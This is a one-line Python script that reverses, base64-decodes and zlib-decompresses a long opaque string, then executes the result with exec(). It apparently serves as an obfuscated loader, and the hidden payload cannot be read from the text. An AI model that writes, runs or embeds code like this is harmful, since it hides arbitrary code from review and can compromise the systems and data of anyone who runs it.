import base64; import zlib; _0x1 = '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'; exec(zlib.decompress(base64.b64decode(_0x1[::-1])))